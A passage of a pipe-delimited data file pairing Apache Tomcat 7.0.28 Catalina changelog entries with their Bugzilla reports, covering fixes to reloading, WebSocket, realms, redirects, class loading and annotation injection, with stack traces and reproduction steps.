The second return (at the bottom of the method body) should return 'false', i.e. there is no match."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53021
Catalina|Tomcat 7.0.28 (markt)|add||Add new attributes of allow and deny to UserConfig. (kfujino)|||
Catalina|Tomcat 7.0.28 (markt)|fix|53024|Fix context reloading so requests received during the reload are paused and processed when reloading completes rather than receiving 404 responses. (markt)|Accessing Servlet while Reloading context gives 404 error|"I think the following Tomcat 6 bug is reoccuring in Tomcat 7.0.26:
https://issues.apache.org/bugzilla/show_bug.cgi?id=43683"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53024
Catalina|Tomcat 7.0.28 (markt)|add||Improve the handling of watched resources so that changes trigger a reload rather than a stop followed by a start which allows requests received to be paused and processed when reloading completes rather than receiving 404 responses. (markt)|||
Catalina|Tomcat 7.0.28 (markt)|fix||Remove potential bottleneck on creation of new WebSocket connections. (markt)|||
Catalina|Tomcat 7.0.28 (markt)|fix|53047|If a JDBC Realm or DataSource Realm is configured for an all roles mode that only requires authorization (and no roles) and no role table or column is defined, don't populate the Principal's roles. (markt)|"JDBCRealm allRolesMode=""authOnly"" still needs role table"|"When a JDBCRealm is created with the allRolesMode attribute set to ""authOnly"" a role table is still needed even though the documentation states: ""The alternative values are authOnly which means that the user must be authenticated but no check is made for assigned roles"". No check implies no role table needed. Hint: JDBCRealm.hasRole should probably always return true if the allRolesMode is set to ""authOnly"". The current workaround is to create a view over the user table with a fixed role name."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53047
Catalina|Tomcat 7.0.28 (markt)|fix|53056|Add APR version number to tcnative version INFO log message. (schultz)|Add APR version number to tcnative version INFO log message|"When tcnative starts, it emits information like this to catalina.out:

pr 10, 2012 4:54:55 PM org.apache.catalina.core.AprLifecycleListener init
INFO: Loaded APR based Apache Tomcat Native library 1.1.23.
Apr 10, 2012 4:54:55 PM org.apache.catalina.core.AprLifecycleListener init
INFO: APR capabilities: IPv6 [true], sendfile [true], accept filters [false], random [true].

It would be nice if the APR version in use could also be displayed as well as the tcnative version. Maybe the OpenSSL version, too."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53056
Catalina|Tomcat 7.0.28 (markt)|fix|53057|Add OpenSSL version number INFO log message when initializing. (schultz)|Add OpenSSL version number to INFO log message when initializing|It would be nice to see a message confirming the initialization of OpenSSL including its version number.|https://bz.apache.org/bugzilla/show_bug.cgi?id=53057
Catalina|Tomcat 7.0.28 (markt)|update||Save a bit of memory in annotations cache in DefaultInstanceManager by trimming annotation lists to their size. (kkolinko)|||
Catalina|Tomcat 7.0.28 (markt)|fix||Correctly configure the parser used to process server.xml so that external entities may be used to include the content of external files into server.xml. (markt)|||
Catalina|Tomcat 7.0.28 (markt)|fix||Make sure ContextMBean#findFilterDefs returns correct filter definitions. (kfujino)|||
Catalina|Tomcat 7.0.28 (markt)|add||Ensure that maxParameterCount applies to multi-part requests handled via the Servlet 3 file upload API. (markt)|||
Catalina|Tomcat 7.0.28 (markt)|fix|53062|When constructing absolute URLs for redirects from relative URLs ensure that the resulting URLs are normalized. (markt)|Tomcat doesn't normalize absolute urls for redirect|"Created attachment 28582 [details]
A demo app that demonstrates the problem. Issue a request to /serv1 and check the produced 'Location' response header

Issuing a redirect like:

  response.sendRedirect(""./serv2"");

will lead to a response header like:

  Location:http://localhost:8080/./serv2

and this causes problems for some not that smart user agents like Internet Explorer and JMeter.

The problem has been reported few times in Apache Wicket's Jira.
Wicket works only with relative urls and lets the web container to make them absolute when a redirect is needed. But it seems only Tomcat produces absolute urls with '../' and/or './' inside and let the user agent to normalize them. Other web containers normalize the url at the server side and make user agents life easier.

See 
https://issues.apache.org/jira/browse/WICKET-2732
https://issues.apache.org/jira/browse/WICKET-4260"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53062
Catalina|Tomcat 7.0.28 (markt)|fix|53067|Ensure the WebSocket Servlet continues to work when requests are wrapped. (markt)|WebSocket implementation issue with wrapped requests|"Originally reported in Atmosphere

    https://github.com/Atmosphere/atmosphere/issues/280

Mainly the WebSocketServlet must make sure the request hasn't been wrapped when looking at the RequestFacade and if wrapped, cycle until it find the original request."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53067
Catalina|Tomcat 7.0.28 (markt)|fix||Enable host's xmlBase attribute in ContextConfig. (kfujino)|||
Catalina|Tomcat 7.0.28 (markt)|fix|53071|Use the message from the throwable (if there is one) when generating the report in the ErrorReportValve and no message has been specified via sendError(). (markt)|ErrorReportValve ignores message from throwable|"When setting

> request.setAttribute(Globals.EXCEPTION_ATTR, e);
> response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);

in a server-side component the throwable#getMessage is completely ignored and only the stacktrace is shown. Message is not retrieved. Line 161 has to be simply replaced with

> if (throwable != null)
>   message = RequestUtil.filter(throwable.getMessage());
> else
>   message = RequestUtil.filter(response.getMessage());

The throwable message is nicely displayed."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53071
Catalina|Tomcat 7.0.28 (markt)|fix|53074|Switch to an infinite socket timeout by default for WebSocket connections. (markt)|[websocket] java.net.SocketTimeoutException: Read timed caused by server.xml' connectTimeout|"The default connectTimeout value is set to 20000 and cause issue with WebSocket connection

java.net.SocketTimeoutException: Read timed out
    at java.net.SocketInputStream.socketRead0(Native Method)
    at java.net.SocketInputStream.read(SocketInputStream.java:129)
    at org.apache.coyote.http11.upgrade.UpgradeBioProcessor.read(UpgradeBioProcessor.java:75)
    at org.apache.catalina.websocket.WsFrame.nextFrame(WsFrame.java:213)
    at org.apache.catalina.websocket.WsInputStream.nextFrame(WsInputStream.java:68)
    at org.apache.catalina.websocket.StreamInbound.onData(StreamInbound.java:143)
    at org.apache.coyote.http11.upgrade.UpgradeProcessor.upgradeDispatch(UpgradeProcessor.java:83)
    at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:563)
    at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:307)
    at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
    at java.lang.Thread.run(Thread.java:680)

Increasing the value delay the issue (but the timeout should not occurs)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53074
Catalina|Tomcat 7.0.28 (markt)|fix|53081|Do not always cache resources loaded by the web application class loader since they may be very large which in turn could trigger a memory leak. Calls to the web application class loader's getResourceAsStream() method will now access the resource directly rather than via the cache in most cases. (markt)|WebappClassLoader causes java.lang.OutOfMemoryError in findResourceInternal()|"When examining the code of WebappClassLoader#findResourceInternal() (http://grepcode.com/file/repo1.maven.org/maven2/org.apache.tomcat/tomcat-catalina/7.0.26/org/apache/catalina/loader/WebappClassLoader.java#3098) I came to the conclusion that findResourceInternal() always loads the binary content of the resource, however binary content is only used in e.g. findClassInternal() and obviously not needed in findResource(). In certain cases this can cause OutOfMemoryError, for example when a big media file is packaged with application.

The example of stack trace is given here:
http://stackoverflow.com/questions/10100480

Solution: the binary content should be loaded for certain types of resources (.classpath or .properties [only if fileNeedConvert is true])."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53081
Catalina|Tomcat 7.0.28 (markt)|fix|53090|Include superclasses when considering injection targets. Patch provided by Borislav Kapukaranov. (markt)|Servlet superclass injection targets are ignored|"Created attachment 28623 [details]
patch that shows the processing of the servlet's superclass injections

Hi folks,

I've been running Tomcat 7.0.26 in a JEE container against the EE6 Web Profile CTS.
In many of the tests there is the following scenario: A servlet 'X' extends a regular class 'Y'. An env-entry element for a field in 'Y' with injection-target-class equal to 'Y' is defined in the app's web.xml. The injection-target-name points to a field that is not annotated.

When the app boots and Tomcat handles the injections for the servlet it processes only those that are defined explicitly for the 'X' servlet's class name, ignoring its superclasses.

I'm attaching a patch I made on top of 7.0.x/trunk that fixed the issue. It's quite small.

I believe Tomcat should respect the injections for the servlet's superclasses. What do you think is the right behavior?

Thank you,
Bobby"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53090
Catalina|Tomcat 7.0.28 (markt)|fix|53161|Provide a better error message if a ClassFormatException occurs during annotation scanning and do not prevent the web application from starting in this case. (markt)|Need better error message for annotation scanning errors|"See this question on SO:
http://stackoverflow.com/questions/10373077/tomcat-7-severe-a-child-container-failed-during-start

There is a problem scanning a class but no info on which one. It could be fault input of BCEL could need updating for a newer Java version. If the error message identified the class triggering the problem, it could be analysed.

A better error message is required that names the class having the problem."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53161
Catalina|Tomcat 7.0.28 (markt)|fix|53180|Improve check for setter method when processing annotations. Patch provided by Violeta Georgieva. (markt)|DefaultInstanceManager#populateAnnotationsCache - incomplete check is used when validating for a setter method|"Created attachment 28711 [details]
Patch proposal

Hi,

In org.apache.catalina.core.DefaultInstanceManager#populateAnnotationsCache, when iterating over methods in a given class, in one of the cases (when injection-target is specified) you validate whether the method is a valid setter method. In my opinion the check that is used for that validation is not complete.
I would like to propose a patch (attached) that introduces additional checks in order to guarantee that the corresponding method is really suitable to be an injection target.

I'm looking forward to your commends.

Best Regards
Violeta Georgieva"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53180
Catalina|Tomcat 7.0.28 (markt)|fix|53225|"Fix an IllegalStateException due to the JAR file being closed when accessing static resources in a JAR file when urlCacheProtection=""false"" in the JreMemoryLeakPreventionListener. (markt)"|"IllegalStateException ""zip file closed"" with resource from webfragment jar if JreMemoryLeakPreventionListener is removed"|"Created attachment 28764 [details]
icontest.war

The issue was reported in the following thread on users@:
http://markmail.org/thread/m6fimchl2jk2vyl4
http://marc.info/?t=133665328700005&r=1&w=2

I am able to reproduce the issue on current trunk with the following steps:

1. Remove JreMemoryLeakPreventionListener from server.xml
2. Deploy the attached war file, icontest.war
It contains WEB-INF/lib/icon.jar with several copies of Tomcat icon
3. Start Tomcat and access the following URL:
http://localhost:8080/icontest/favicon.ico

Expected behaviour:
The icon is displayed

Actual behaviour:
[[[
13-May-2012 00:23:05.906 SEVERE [http-bio-8080-exec-1] org.apache.coyote.http11.AbstractHttp11Processor.process Error processing request
 java.lang.IllegalStateException: zip file closed
	at java.util.jar.JarFile.getMetaInfEntryNames(Native Method)
	at java.util.jar.JarFile.maybeInstantiateVerifier(JarFile.java:279)
	at java.util.jar.JarFile.getInputStream(JarFile.java:383)
	at org.apache.naming.resources.WARDirContext$WARResource.streamContent(WARDirContext.java:990)
	at org.apache.naming.resources.ProxyDirContext.cacheLoad(ProxyDirContext.java:1621)
	at org.apache.naming.resources.ProxyDirContext.cacheLookup(ProxyDirContext.java:1501)
	at org.apache.naming.resources.ProxyDirContext.lookup(ProxyDirContext.java:262)
	at org.apache.tomcat.util.http.mapper.Mapper.internalMapWrapper(Mapper.java:996)
	at org.apache.tomcat.util.http.mapper.Mapper.internalMap(Mapper.java:808)
	at org.apache.tomcat.util.http.mapper.Mapper.map(Mapper.java:671)
	at org.apache.catalina.connector.CoyoteAdapter.postParseRequest(CoyoteAdapter.java:646)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:402)
	at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:995)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:573)
	at org.apache.coyote.http11.Http11Protocol$Http11ConnectionHandler.process(Http11Protocol.java:145)
	at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:311)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:662)
]]]"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53225
Catalina|Tomcat 7.0.28 (markt)|fix|53230|Changed ManagerBase to throw TooManyActiveSessionsException instead of IllegalStateException when the maximum number of sessions has been exceeded and a new session will not be created. (schultz)|Allow custom error mapping when Manager's maxActiveSessions is exceeded|"Tomcat 7.0.27

In ManagerBase an IllegalStateException is thrown when the configured maxActiveSessions attribute is exceeded.

This allows no customized error handling via configuration in web.xml.

See discussion: http://markmail.org/thread/xqjgdhf32gjrzjz2

Can be reproduced with the sample application:
http://localhost:8080/examples/jsp/security/protected/index.jsp

Just set maxActiveSession=""0"" in ${catalina.base}/conf/context.xml

A configuration like this would be very useful:

<error-page>
   <exception-type>org.apache.catalina.session.MaxActiveSessionsExceededException</exception-type>
   <location>/maxSessions.html</location>
</error-page>"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53230
Catalina|Tomcat 7.0.28 (markt)|fix|53257|Ensure that resources, including JSP files, that have names that include characters with special meanings in URLs (such as ampersand, semicolon, plus, hash and percent) are correctly handled. This bug is partially a regression caused by the original fix for 51584 and partially an existing issue that had not previously been identified. This fix reverts the original fix for 51584, correctly fixes that issue and fixes the additional issues identified by the test cases that were also added as part of this fix. (markt/kkolinko)|getLastModified() of compilation context returns negative number|"Created attachment 28802 [details]
full stacktrace

Jasper Compiler has an issue on compiling JSPs if they are contained in a folder like the following example: /a+b/test.jsp. The plus charachter seems to break 
 the org.apache.jasper.JspCompilationContext#getLastModified() method, because it returns -1 every time:

java.lang.IllegalArgumentException: Negative time
	java.io.File.setLastModified(File.java:1258)
	org.apache.jasper.compiler.Compiler.compile(Compiler.java:376)
	org.apache.jasper.compiler.Compiler.compile(Compiler.java:353)
	org.apache.jasper.compiler.Compiler.compile(Compiler.java:340)
	org.apache.jasper.JspCompilationContext.compile(JspCompilationContext.java:644)
	org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:358)
	org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:389)
	org.apache.jasper.servlet.JspServlet.service(JspServlet.java:333)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:722)
	*******************************************************
	*******************************************************
	net.sf.ehcache.constructs.web.filter.GzipFilter.doFilter(GzipFilter.java:81)
	net.sf.ehcache.constructs.web.filter.Filter.doFilter(Filter.java:92)
	org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:88)
	org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:76)

Some details:
 - First I suspected URIEncoding=""utf-8"" in the Connector, but removing the configuration didn't fix the bug
 - The same bug occurs on my developing machine (Windows 7, NTFS, Apache Tomcat 7.0.22)
 - On a other customer machine the same example as above worked fine! (Any Linux Distribution, Apache Tomcat 7.0.19)
 - By the way I also tried the right URI-Encoding: http://.../a%2Bb/test.jsp

Please find attached the full stack trace

Best Regards
A. Etzlstorfer"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53257
Catalina|Tomcat 7.0.28 (markt)|fix|53266|If a class specified in a @HandlesTypes annotation on a ServletContainerInitializer is missing log a more helpful message and do not prevent the web application from starting. (markt)|ServletContainerInitializer will crash catalina if dependcy is not present.|"When using a ServletContainerInitializer with a HandlesTypes annotation if any of the classes specified in the HandlesTypes annotation are not available due to a missing jar file catalina will crash with a ""java.lang.ArrayStoreException: sun.reflect.annotation.TypeNotPresentExceptionProxy"".

Caused by: java.lang.ArrayStoreException: sun.reflect.annotation.TypeNotPresentExceptionProxy
	at sun.reflect.annotation.AnnotationParser.parseClassArray(AnnotationParser.java:653)
	at sun.reflect.annotation.AnnotationParser.parseArray(AnnotationParser.java:460)
	at sun.reflect.annotation.AnnotationParser.parseMemberValue(AnnotationParser.java:286)
	at sun.reflect.annotation.AnnotationParser.parseAnnotation(AnnotationParser.java:222)
	at sun.reflect.annotation.AnnotationParser.parseAnnotations2(AnnotationParser.java:69)
	at sun.reflect.annotation.AnnotationParser.parseAnnotations(AnnotationParser.java:52)
	at java.lang.Class.initAnnotationsIfNecessary(Class.java:3070)
	at java.lang.Class.getAnnotation(Class.java:3029)
	at org.apache.catalina.startup.ContextConfig.processServletContainerInitializers(ContextConfig.java:1546)
	at org.apache.catalina.startup.ContextConfig.webConfig(ContextConfig.java:1222)
	at org.apache.catalina.startup.ContextConfig.configureStart(ContextConfig.java:855)
	at org.apache.catalina.startup.ContextConfig.lifecycleEvent(ContextConfig.java:345)
	at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:119)
	at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:90)
	at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5161)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150)
	... 7 more

Line where exception is thrown: ""HandlesTypes ht = sci.getClass().getAnnotation(HandlesTypes.class);"""|https://bz.apache.org/bugzilla/show_bug.cgi?id=53266
Catalina|Tomcat 7.0.28 (markt)|fix|53267|Ensure that using the GC Daemon Protection feature of the JreMemoryLeakPreventionListener does not trigger a full GC every hour. (markt)|The JreMemoryLeakPreventionListener causes a full GC every hour when gcDaemonProtection=true|"Created attachment 28809 [details]
Increases timeout on sun.misc.GC.requestLatency in JreMemoryLeakPreventionListener

The JreMemoryLeakPreventionListener causes a full GC every hour when gcDaemonProtection=true.

The prevention technique invokes sun.misc.GC.requestLatency with a value of 360000.  Increasing the value to Long.MAX_VALUE would be beneficial.

The attached patches add a default setting of Long.MAX_VALUE (add documentation update), but also permit it to be configured to a lower value using a System property."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53267
Catalina|Tomcat 7.0.28 (markt)|fix|53285|Do not require security-role-ref elements to contain a role-link element. (markt)|Web app configuration fails when security-role-ref does not contain role-link|"Created attachment 28829 [details]
Sample WAR

The <role-link> element is optional content within <security-role-ref>. However, an application will fail to deploy if the optional element is missing.

I've attached a sample WAR that highlights the problem. Note, the attached WAR will deploy ok in 6.0.35.

Console output from running 7.0.27 embedded in Eclipse:
INFO: Starting Servlet Engine: Apache Tomcat/7.0.27
24/05/2012 2:32:34 PM org.apache.tomcat.util.digester.Digester endElement
SEVERE: End event threw exception
Throwable occurred: java.lang.IllegalArgumentException: Can't convert argument: null
	at org.apache.tomcat.util.IntrospectionUtils.convert(IntrospectionUtils.java:966)
	at org.apache.tomcat.util.digester.CallMethodRule.end(CallMethodRule.java:476)
	at org.apache.tomcat.util.digester.Digester.endElement(Digester.java:1051)
	at org.apache.xerces.parsers.AbstractSAXParser.endElement(Unknown Source)
	at org.apache.xerces.impl.XMLDocumentFragmentScannerImpl.scanEndElement(Unknown Source)
	at org.apache.xerces.impl.XMLDocumentFragmentScannerImpl$FragmentContentDispatcher.dispatch(Unknown Source)
	at org.apache.xerces.impl.XMLDocumentFragmentScannerImpl.scanDocument(Unknown Source)
	at org.apache.xerces.parsers.XML11Configuration.parse(Unknown Source)
	at org.apache.xerces.parsers.XML11Configuration.parse(Unknown Source)
	at org.apache.xerces.parsers.XMLParser.parse(Unknown Source)
	at org.apache.xerces.parsers.AbstractSAXParser.parse(Unknown Source)
	at org.apache.xerces.jaxp.SAXParserImpl$JAXPSAXParser.parse(Unknown Source)
	at org.apache.tomcat.util.digester.Digester.parse(Digester.java:1537)
	at org.apache.catalina.startup.ContextConfig.parseWebXml(ContextConfig.java:1825)
	at org.apache.catalina.startup.ContextConfig.webConfig(ContextConfig.java:1201)
	at org.apache.catalina.startup.ContextConfig.configureStart(ContextConfig.java:855)
	at org.apache.catalina.startup.ContextConfig.lifecycleEvent(ContextConfig.java:345)
	at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:119)
	at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:90)
	at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5161)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150)
	at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1566)
	at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1556)
	at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:314)
	at java.util.concurrent.FutureTask.run(FutureTask.java:149)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:897)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:919)
	at java.lang.Thread.run(Thread.java:736)
24/05/2012 2:32:34 PM org.apache.catalina.startup.ContextConfig parseWebXml
SEVERE: Parse error in application web.xml file at jndi:/localhost/testApp/WEB-INF/web.xml
Throwable occurred: java.lang.IllegalArgumentException: Can't convert argument: null
	at org.apache.tomcat.util.digester.Digester.createSAXException(Digester.java:2687)
	at org.apache.tomcat.util.digester.Digester.createSAXException(Digester.java:2719)
	at org.apache.tomcat.util.digester.Digester.endElement(Digester.java:1054)
	at org.apache.xerces.parsers.AbstractSAXParser.endElement(Unknown Source)
	at org.apache.xerces.impl.XMLDocumentFragmentScannerImpl.scanEndElement(Unknown Source)
	at org.apache.xerces.impl.XMLDocumentFragmentScannerImpl$FragmentContentDispatcher.dispatch(Unknown Source)
	at org.apache.xerces.impl.XMLDocumentFragmentScannerImpl.scanDocument(Unknown Source)
	at org.apache.xerces.parsers.XML11Configuration.parse(Unknown Source)
	at org.apache.xerces.parsers.XML11Configuration.parse(Unknown Source)
	at org.apache.xerces.parsers.XMLParser.parse(Unknown Source)
	at org.apache.xerces.parsers.AbstractSAXParser.parse(Unknown Source)
	at org.apache.xerces.jaxp.SAXParserImpl$JAXPSAXParser.parse(Unknown Source)
	at org.apache.tomcat.util.digester.Digester.parse(Digester.java:1537)
	at org.apache.catalina.startup.ContextConfig.parseWebXml(ContextConfig.java:1825)
	at org.apache.catalina.startup.ContextConfig.webConfig(ContextConfig.java:1201)
	at org.apache.catalina.startup.ContextConfig.configureStart(ContextConfig.java:855)
	at org.apache.catalina.startup.ContextConfig.lifecycleEvent(ContextConfig.java:345)
	at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:119)
	at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:90)
	at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5161)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150)
	at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1566)
	at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1556)
	at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:314)
	at java.util.concurrent.FutureTask.run(FutureTask.java:149)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:897)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:919)
	at java.lang.Thread.run(Thread.java:736)
24/05/2012 2:32:34 PM org.apache.catalina.startup.ContextConfig parseWebXml
SEVERE: Occurred at line 18 column 23"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53285
Catalina|Tomcat 7.0.28 (markt)|fix|53301|Prevent double initialization of pre-created Servlet instances when used in embedded mode. (markt)|Servlet init method called twice with embedded Tomcat|When using embedded Tomcat, the servlet init method is called twice by the container. This has been seen with an Apache DirectMemory unit test. I have checked with a normal Tomcat launched by the Tomcat Maven plugin (mvn tomcat7:run) and in this case, the init method is correctly called once.|https://bz.apache.org/bugzilla/show_bug.cgi?id=53301
Catalina|Tomcat 7.0.28 (markt)|fix|53322|When processing resource injection, correctly infer property name from its setter method if the name starts with several uppercase characters. (kkolinko)|Odd decapitalization when inferring JavaBean property from setter name for an injection target|"There is code in DefaultInstanceManager class that converts a setter method name into JavaBean property name.

The code is wrong: it removes ""set"" prefix and then converts the first character into lowercase. That is a wrong way to get JavaBeans property name.

The correct way would be to follow JavaBeans specification 1.01 ch.8.8 [1] and use java.beans.Introspector#decapitalize(String) method.

E.g. for method setURL(..) the correct property name would be ""URL"", not ""uRL"".


[1] http://www.oracle.com/technetwork/java/javase/documentation/spec-136004.html"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53322
Catalina|Tomcat 7.0.28 (markt)|fix|53333|When processing JNDI resources, take account of the types of any specified injection targets to ensure that the resource definition and the injection target types are consistent. Based on a patch provided by Violeta Georgieva. (markt)|NPE is thrown for env-entry without env-entry-type but with injection-target specified|"Created attachment 28863 [details]
Test web application

Hi,

I have a web application (attached) that specifies env-entry in the web.xml. The env-entry does not specify env-entry-type, but specifies injection-target. When deploying that web application, the exception below is thrown:


Caused by: java.lang.NullPointerException
	at java.util.Hashtable.put(Hashtable.java:394)
	at org.apache.catalina.deploy.NamingResources.addEnvironment(NamingResources.java:254)
	at org.apache.catalina.deploy.WebXml.configureContext(WebXml.java:1195)
	at org.apache.catalina.startup.ContextConfig.webConfig(ContextConfig.java:1294)
	at org.apache.catalina.startup.ContextConfig.configureStart(ContextConfig.java:855)
	at org.apache.catalina.startup.ContextConfig.lifecycleEvent(ContextConfig.java:345)
	at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:119)
	at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:90)
	at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5161)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150)


Servlet Specification, 14.4 Deployment Descriptor Diagram, describes that use case and how it should be handled:
""
env-entry element
If an injection-target is specified for the environment entry, the enventry-
type may be ommitted or MUST match the type of the injection target. If
no injection-target is specified, the env-entry-type is required.
""


I would like to propose a patch (attached) that solves this issue.

I'm looking forward for your comments.

Thanks
Violeta


Steps to reproduce the problem:
1. Deploy the attached application
2. Request http://localhost:8080/test/TestServlet
3. NPE is thrown
4. Apply the provided patch
5. Request http://localhost:8080/test/TestServlet
6. The following response should be generated:
envEntry_1: 1 
envEntry_2: 2 
dataSource: org.apache.tomcat.dbcp.dbcp.BasicDataSource@506dd108"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53333
Catalina|Tomcat 7.0.28 (markt)|fix|53337|Forwarding via a RequestDispatcher to an asynchronous Servlet always failed. Includes a test case based on code by Rossen Stoyanchev. (markt)|||https://bz.apache.org/bugzilla/show_bug.cgi?id=53337
Catalina|Tomcat 7.0.28 (markt)|fix|53339|Ensure WebSocket call backs (onOpen etc.) are called using the web application's class loader. (markt)|ClassNotFoundException when using WebSocketServlet|"I'm trying to do a JNDI lookup inside the ""onOpen"" method of my StreamInbound class, but it gives me the exception below.  The code works if I move my JNP JARs to the server lib instead of the webapp lib.  The code also works fine from anywhere else, like in the ""doGet"" method.


ERROR http-bio-8080-exec-3 Test 
javax.naming.NoInitialContextException: Cannot instantiate class: org.jnp.interfaces.NamingContextFactory [Root exception is java.lang.ClassNotFoundException: org.jnp.interfaces.NamingContextFactory]
	at javax.naming.spi.NamingManager.getInitialContext(NamingManager.java:657)
	at javax.naming.InitialContext.getDefaultInitCtx(InitialContext.java:288)
	at javax.naming.InitialContext.init(InitialContext.java:223)
	at javax.naming.InitialContext.<init>(InitialContext.java:197)
	at Test$TestStreamInbound.onOpen(Test.java:103)
	at org.apache.catalina.websocket.StreamInbound.onUpgradeComplete(StreamInbound.java:180)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:579)
	at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:307)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:662)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53339
Catalina|Tomcat 7.0.28 (markt)|fix|53342|To avoid BindException, make startStopThreads into a demon thread. (kfujino)|If starting immediately after Tomcat stop fail, BindException will throw.|"e.g.
When Context#stop throw LifecycleException, the main thread stops, 
but startStopThreads of Host/Engine will remain for a while. 
Because, startStopThreads is not a demon thread. 

As a result, 
even if a main thread stops, Acceptor Threads of 8080/8009 is not stopped. 

keepAliveTime for 10 seconds is set up now. 
===
startStopExecutor = new ThreadPoolExecutor(
            getStartStopThreadsInternal(),
            getStartStopThreadsInternal(), 10, TimeUnit.SECONDS,
            startStopQueue);
===

Therefore, in order to avoid BindException, the waiting for 10 seconds is required. 

I think that I need to make startStopThreads into a demon thread. 

Best Regards."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53342
Catalina|Tomcat 7.0.28 (markt)|fix|53353|Make the internal HTTP header parser more tolerant of Content-Type values that contain invalid parameters by ignoring the invalid parameters. It is a followup to bug 52811. (markt)|Malformed contentType attribute results in two charset values|"If contentType attribute of a JSP page has a broken value, Tomcat 7 can behave strangely and send two charset values in Content-Type header.

To reproduce:
1. Create this simple JSP file, ROOT/test.jsp
Note, that there is a typo: ""UTF-8"" instead of ""charset=UTF-8"". It is what triggers this issue.

[[[
<%@page pageEncoding=""UTF-8"" contentType=""text/html; UTF-8"" %>
Hello world!
]]]

2. Start Tomcat and access the page with Firefox
http://localhost:8080/test.jsp

(I am using version 12, with Live HTTP Headers addon). When the page loads: right-click -> Page info -> look for the value of Encoding. Then look for the value of Content-Type header.

With current Tomcat 6.0:
Encoding: UTF-8
Content-Type header: text/html; UTF-8;charset=UTF-8

With current Tomcat 7.0 (7.0.23):
Encoding: ISO-8859-1
Content-Type header: text/html; UTF-8;charset=UTF-8;charset=ISO-8859-1

===============

I think it is related to new contentType header parser (fix for bug 52811: r1300154 + r1300155 + r1304275 + r1304895).

It is not a very convincing example, but it looks like it confirms the fears against backporting the fix for bug 52811 to 6.0."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53353
